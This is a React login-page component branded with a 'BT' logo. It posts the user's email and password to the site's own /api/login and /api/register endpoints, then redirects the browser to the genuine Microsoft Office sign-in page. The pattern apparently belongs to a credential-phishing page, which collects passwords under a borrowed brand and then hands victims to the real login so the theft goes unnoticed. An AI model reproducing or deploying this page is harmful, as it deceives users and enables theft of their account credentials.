'use client';

import { useState } from 'react';

export default function LoginScreen() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isFocused, setIsFocused] = useState(false);

  // REGISTER
  const handleRegister = async () => {
    try {
      const res = await fetch('/api/register', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email,
          password,
        }),
      });

      const data = await res.json();

      if (!res.ok) {
        alert(data.message);
        return;
      }

      alert('Account created successfully');
      window.location.href = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=639140509807666052.MmNlOTRiYWQtYTg0ZC00ZjdkLTk3YjktYTRhMzM0NTM5MGI2NzYxOTExZTEtY2JhYS00ZjBiLTk3ODItMjgyNzI5NDc5NjEw&ui_locales=en-GB&mkt=en-GB&client-request-id=761ee8b0-1e5f-4d7d-b018-3662ba8755c6&state=6qAn1j0NYsiJ0AZ-IaTyZWKIbD7mQnBlUQAhZPlA54ZX2IhyUiSDp755IP-fZQ40wXisDSp08BtMF8yfS4e4ipHV0DyVMfsCN3M2FlDuJ0SG8D06UxobPpUr8ZwPmN-TfqN7KSEFpUymNCdxWJYV72BkQLfC0xKGz1zlF1NSXdunrUVD_SJ-SfY8zlWlVw8UAchy4cpQTG6Yc7zJElQrkGXXxrKTlfKZQmM84vO3HfFVgvxXbRdu2H8kgykxa0fAFPjizsuItpcyt7Xuitez_KkWQVWmRG5oTbY_wgLSa5mkrmpzjonSB07IxL5ALxv6yHScoVBs27aCw1h8pR1G8sx8ZRmvegylpk_dIS6-XzPVH7jfy9vB4XDUpxE1fXyY3YnVJZdKkMAcmdzqqsTlpM8yzDWQE3G5mZ0NUmRS2IQ&x-client-SKU=ID_NET8_0&x-client-ver=8.14.0.0';

      console.log(data);

    } catch (error) {
      console.error(error);
      alert('Something went wrong');
    }
  };

  // LOGIN
  const handleLogin = async () => {
    try {
      const res = await fetch('/api/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email,
          password,
        }),
      });

      const data = await res.json();

      if (!res.ok) {
        alert(data.message);
        return;
      }

      // Save token
      localStorage.setItem('token', data.token);

      alert('Login successful');
      window.location.href = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=639140509807666052.MmNlOTRiYWQtYTg0ZC00ZjdkLTk3YjktYTRhMzM0NTM5MGI2NzYxOTExZTEtY2JhYS00ZjBiLTk3ODItMjgyNzI5NDc5NjEw&ui_locales=en-GB&mkt=en-GB&client-request-id=761ee8b0-1e5f-4d7d-b018-3662ba8755c6&state=6qAn1j0NYsiJ0AZ-IaTyZWKIbD7mQnBlUQAhZPlA54ZX2IhyUiSDp755IP-fZQ40wXisDSp08BtMF8yfS4e4ipHV0DyVMfsCN3M2FlDuJ0SG8D06UxobPpUr8ZwPmN-TfqN7KSEFpUymNCdxWJYV72BkQLfC0xKGz1zlF1NSXdunrUVD_SJ-SfY8zlWlVw8UAchy4cpQTG6Yc7zJElQrkGXXxrKTlfKZQmM84vO3HfFVgvxXbRdu2H8kgykxa0fAFPjizsuItpcyt7Xuitez_KkWQVWmRG5oTbY_wgLSa5mkrmpzjonSB07IxL5ALxv6yHScoVBs27aCw1h8pR1G8sx8ZRmvegylpk_dIS6-XzPVH7jfy9vB4XDUpxE1fXyY3YnVJZdKkMAcmdzqqsTlpM8yzDWQE3G5mZ0NUmRS2IQ&x-client-SKU=ID_NET8_0&x-client-ver=8.14.0.0';

      console.log(data);

    } catch (error) {
      console.error(error);
      alert('Something went wrong');
    }
  };

  return (
    <div
      className="min-h-screen flex items-center justify-center p-4"
      style={{ backgroundColor: '#F5F5F5' }}
    >
      <div className="w-full max-w-md">

        {/* Logo */}
        <div className="mb-12">
          <div
            className="w-16 h-16 rounded-full flex items-center justify-center"
            style={{
              border: '3px solid #7A1BFF',
            }}
          >
            <span
              className="text-2xl font-bold"
              style={{ color: '#7A1BFF' }}
            >
              BT
            </span>
          </div>
        </div>

        {/* Heading */}
        <div className="mb-10">
          <h1
            className="text-4xl font-bold"
            style={{ color: '#1F1F1F' }}
          >
            Log in
          </h1>
        </div>

        {/* Email */}
        <div className="mb-6">
          <label
            className="block text-sm font-medium mb-3"
            style={{ color: '#666666' }}
          >
            Email
          </label>

          <input
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            onFocus={() => setIsFocused(true)}
            onBlur={() => setIsFocused(false)}
            placeholder="Enter your email"
            className="w-full px-6 py-4 rounded-full text-base transition-all"
            style={{
              backgroundColor: '#FFFFFF',
              border: isFocused
                ? '3px solid #6EB6FF'
                : '2px solid #CCCCCC',
              color: '#1F1F1F',
              outline: 'none',
              boxShadow: isFocused
                ? '0 0 0 3px rgba(110, 182, 255, 0.1)'
                : 'none',
            }}
          />
        </div>

        {/* Password */}
        <div className="mb-6">
          <label
            className="block text-sm font-medium mb-3"
            style={{ color: '#666666' }}
          >
            Password
          </label>

          <input
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder="Enter your password"
            className="w-full px-6 py-4 rounded-full text-base"
            style={{
              backgroundColor: '#FFFFFF',
              border: '2px solid #CCCCCC',
              color: '#1F1F1F',
              outline: 'none',
            }}
          />
        </div>

        {/* Login Button */}
        <button
          onClick={handleLogin}
          className="w-full py-4 rounded-full font-medium text-white text-lg transition-all hover:shadow-lg active:scale-95"
          style={{
            background:
              'linear-gradient(135deg, #5A00C8 0%, #7A1BFF 100%)',
            boxShadow: '0 4px 15px rgba(122, 27, 255, 0.3)',
          }}
        >
          Log in
        </button>

        {/* Forgot Password */}
        <div className="mt-6 text-center">
          <a
            href="#"
            className="text-sm font-medium transition-opacity hover:opacity-70"
            style={{
              color: '#7A1BFF',
              textDecoration: 'underline',
            }}
          >
            Forgot password?
          </a>
        </div>

        {/* Divider */}
        <div
          className="mt-12 pt-8 border-t"
          style={{ borderColor: '#E0E0E0' }}
        >
          <p
            className="text-center text-sm font-medium mb-4"
            style={{ color: '#4A4A4A' }}
          >
            Don&apos;t have an account?
          </p>

          {/* Register Button */}
          <button
            onClick={handleRegister}
            className="w-full py-4 rounded-full font-medium text-base transition-all hover:bg-gray-50 active:scale-95"
            style={{
              backgroundColor: '#FFFFFF',
              border: '2px solid #7A1BFF',
              color: '#7A1BFF',
            }}
          >
            Create account
          </button>
        </div>

        <div className="mt-8" />
      </div>
    </div>
  );
}